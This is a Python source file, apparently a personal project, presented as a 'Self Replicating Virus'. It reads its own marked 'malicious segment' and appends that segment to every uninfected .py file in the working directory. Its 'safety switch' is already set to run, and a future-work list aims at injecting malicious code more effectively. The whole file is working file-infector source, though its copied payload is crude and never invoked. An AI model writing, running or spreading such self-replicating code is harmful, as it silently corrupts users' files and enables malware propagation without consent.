'''
--------------------------------------------------------------------------------
Date Created:   11/07/2024
Date Modified:  11/16/2024
Version:        2.0
Author:         Lino Mercado-Esquivias (lino.a.mercado@gmail.com)

Description:    Self Replicating Virus
                A virus that infects other python scripts.

Future Work:    1) Detect "if __name__ == "__main__":" in vectors
                2) Measure indent level in vectors
                3) Inject malicious code properly
--------------------------------------------------------------------------------
'''

# SAFETY SWITCH
RUN_PROGRAM = True     # set to True to run the virus

def main():
    if not RUN_PROGRAM:
        exit(0)

    # prepare payload
    virus_payload = prepare_payload()
    # search for and infect potential hosts
    spread_infection(virus_payload)
    # malicious function
    
    # # test print
    # for line in virus_payload:
    #     print(line, end='')
    

def prepare_payload():
    # MALICIOUS SEGMENT BEGIN
    import sys
    virus_directory = sys.argv[0]
    with open(virus_directory, "r") as virus_file:
        unpacked_virus_file = virus_file.readlines()
    malicious_segment = False
    virus_payload = []
    for line in unpacked_virus_file:
        if line.strip() == "# MALICIOUS SEGMENT BEGIN":
            malicious_segment = True
        if malicious_segment:
            virus_payload.append(line)
        if line.strip() == "# MALICIOUS SEGMENT END":
            malicious_segment = False
    # MALICIOUS SEGMENT END
    return virus_payload

def spread_infection(virus_payload):
    # MALICIOUS SEGMENT BEGIN
    from glob import glob
    # search for potential hosts
    potential_hosts = glob("*.py")
    for vector in potential_hosts:
        with open(vector, "r") as vector_file:
            unpacked_vector_file = vector_file.readlines()

        # check if vector is infected
        infected = False
        for line in unpacked_vector_file:
            if line.strip() == "# MALICIOUS SEGMENT BEGIN":
                infected = True
                break
        
        # inject payload
        if not infected:
            infected_code = unpacked_vector_file + virus_payload
            with open(vector, "w") as vector_file:
                print(f"File {vector} infected.")
                vector_file.writelines(infected_code)
        else:
            print(f"File {vector} has already been infected.")
    # MALICIOUS SEGMENT END

if __name__ == "__main__":
    main()